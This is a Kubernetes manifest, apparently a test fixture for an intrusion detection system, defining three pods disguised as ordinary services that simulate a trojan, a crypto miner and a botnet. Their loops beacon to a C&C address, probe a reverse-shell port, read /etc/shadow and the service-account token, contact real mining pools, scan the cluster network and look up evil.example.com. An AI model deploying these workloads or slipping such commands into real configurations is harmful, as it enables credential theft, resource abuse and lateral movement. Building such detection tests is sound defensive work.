---
# Compromised Pod 1: "backend-api"
# Looks like: REST API backend
# Actually: Reverse shell simulation + data exfiltration (Trojan behavior)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend-api
  namespace: default
  labels:
    app: backend-api
    tier: backend
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backend-api
  template:
    metadata:
      labels:
        app: backend-api
        tier: backend
        kids-label: "1"
    spec:
      tolerations:
        - key: "node-role.kubernetes.io/control-plane"
          operator: "Exists"
          effect: "NoSchedule"
      containers:
        - name: api
          image: alpine:latest
          resources:
            requests:
              cpu: 30m
              memory: 32Mi
            limits:
              cpu: 100m
              memory: 64Mi
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache curl netcat-openbsd > /dev/null 2>&1
              echo "Starting backend-api service..."
              while true; do
                # Simulate normal API activity
                echo "$(date) - Processing API request" >> /tmp/api.log

                # === MALICIOUS: Trojan behavior ===
                # Beacon to C&C (simulated)
                curl -s -o /dev/null --connect-timeout 3 http://10.0.0.1:8080 2>/dev/null || true

                # Attempt reverse shell connection (simulated, will fail)
                nc -z -w 2 10.0.0.1 4444 2>/dev/null || true

                # Data exfiltration: read sensitive files
                cat /etc/passwd > /dev/null 2>&1
                cat /etc/shadow > /dev/null 2>&1
                ls -la /var/run/secrets/kubernetes.io/serviceaccount/ > /dev/null 2>&1
                cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null 2>&1

                # Enumerate environment
                env > /tmp/env_dump 2>/dev/null
                cat /proc/self/cgroup > /dev/null 2>&1

                sleep $((RANDOM % 20 + 10))
              done
---
# Compromised Pod 2: "frontend"
# Looks like: Web frontend serving static content
# Actually: Crypto mining in background (Miner behavior)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend
  namespace: default
  labels:
    app: frontend
    tier: frontend
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
        tier: frontend
        kids-label: "1"
    spec:
      tolerations:
        - key: "node-role.kubernetes.io/control-plane"
          operator: "Exists"
          effect: "NoSchedule"
      containers:
        - name: web
          image: alpine:latest
          resources:
            requests:
              cpu: 50m
              memory: 32Mi
            limits:
              cpu: 150m
              memory: 64Mi
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache curl > /dev/null 2>&1
              echo "Starting frontend service..."
              while true; do
                # Simulate normal web serving
                echo "$(date) - Serving page request" >> /tmp/access.log

                # === MALICIOUS: Crypto mining simulation ===
                # Heavy CPU computation (simulates mining)
                dd if=/dev/urandom bs=1024 count=100 2>/dev/null | md5sum > /dev/null 2>&1
                # More computation cycles
                for i in $(seq 1 50); do
                  echo "$i" | sha256sum > /dev/null 2>&1
                done

                # Mining pool connection attempt (simulated)
                curl -s -o /dev/null --connect-timeout 3 http://pool.minexmr.com:4444 2>/dev/null || true
                curl -s -o /dev/null --connect-timeout 3 http://xmr.pool.minergate.com:45700 2>/dev/null || true

                # Write mining config (suspicious file activity)
                echo '{"pool":"stratum+tcp://pool.example.com:3333"}' > /tmp/.config.json 2>/dev/null

                sleep $((RANDOM % 15 + 5))
              done
---
# Compromised Pod 3: "cache-worker"
# Looks like: Redis/cache background worker
# Actually: Network scanning + lateral movement (Botnet behavior)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cache-worker
  namespace: default
  labels:
    app: cache-worker
    tier: worker
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: cache-worker
  template:
    metadata:
      labels:
        app: cache-worker
        tier: worker
        kids-label: "1"
    spec:
      tolerations:
        - key: "node-role.kubernetes.io/control-plane"
          operator: "Exists"
          effect: "NoSchedule"
      containers:
        - name: worker
          image: alpine:latest
          resources:
            requests:
              cpu: 30m
              memory: 32Mi
            limits:
              cpu: 100m
              memory: 64Mi
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache nmap netcat-openbsd curl > /dev/null 2>&1
              echo "Starting cache-worker..."
              while true; do
                # Simulate normal cache operations
                echo "$(date) - Cache sync operation" >> /tmp/worker.log

                # === MALICIOUS: Botnet/lateral movement ===
                # Network scanning (like Mirai)
                nmap -sn --max-retries 1 --host-timeout 5s 10.42.0.0/24 > /dev/null 2>&1
                nmap -sn --max-retries 1 --host-timeout 5s 10.42.1.0/24 > /dev/null 2>&1

                # Port scanning common vulnerable services
                nc -z -w 1 10.42.0.1 22 2>/dev/null || true
                nc -z -w 1 10.42.0.1 23 2>/dev/null || true
                nc -z -w 1 10.42.0.1 80 2>/dev/null || true
                nc -z -w 1 10.42.0.1 3306 2>/dev/null || true
                nc -z -w 1 10.42.0.1 6379 2>/dev/null || true

                # Try to spread (simulated)
                curl -s -o /dev/null --connect-timeout 3 http://10.42.1.1:8080 2>/dev/null || true

                # DNS exfiltration attempt
                nslookup evil.example.com > /dev/null 2>&1 || true

                sleep $((RANDOM % 30 + 20))
              done
